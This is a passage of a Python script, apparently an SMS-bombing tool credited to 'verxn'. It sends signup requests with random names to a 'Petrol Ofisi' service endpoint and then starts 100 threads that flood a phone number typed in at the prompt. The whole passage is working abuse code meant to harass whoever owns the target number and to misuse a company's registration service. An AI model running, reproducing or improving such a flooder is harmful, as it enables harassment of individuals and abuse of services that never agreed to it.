        "surname" : f"{''.join(random.choices(string.ascii_lowercase, k=8))}"
      }

      headers = {
        "X-Channel" : "IOS"
      }

      r = requests.post(url=url, headers=headers, json=payload, timeout=6)

      if r.status_code == 204:
        helloScreen.printConsole(result="+", service="Petrol Ofisi", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Petrol Ofisi", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="Petrol Ofisi", count=+1, failed=+1)

number = int(input("Numara: "))
amount = int(input("Adet Ne Yazarsan 100x (powered by verxn) "))

for i in range(100):
  threading.Thread(target=helloScreen.startSend, args=(number, amount)).start()